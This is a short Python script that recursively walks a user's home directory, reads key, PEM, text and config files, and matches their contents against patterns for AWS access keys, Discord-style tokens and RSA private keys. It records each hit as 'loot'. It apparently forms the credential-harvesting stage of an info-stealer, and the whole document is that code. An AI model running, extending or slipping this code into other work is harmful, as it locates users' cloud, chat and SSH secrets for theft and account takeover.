import os, re

def run():
    loot = []
    patterns = {"AWS": r"AKIA[0-9A-Z]{16}", "DISC": r"[\w-]{24}\.[\w-]{6}", "SSH": r"BEGIN RSA PRIVATE"}
    for root, _, files in os.walk(os.path.expanduser("~")):
        for f in files:
            if f.endswith(('.key', '.pem', '.txt', '.conf')):
                try:
                    with open(os.path.join(root, f), 'r', errors='ignore') as file:
                        data = file.read()
                        for k, p in patterns.items():
                            if re.search(p, data): loot.append(f"[{k}] in {f}")
                except: continue
    return loot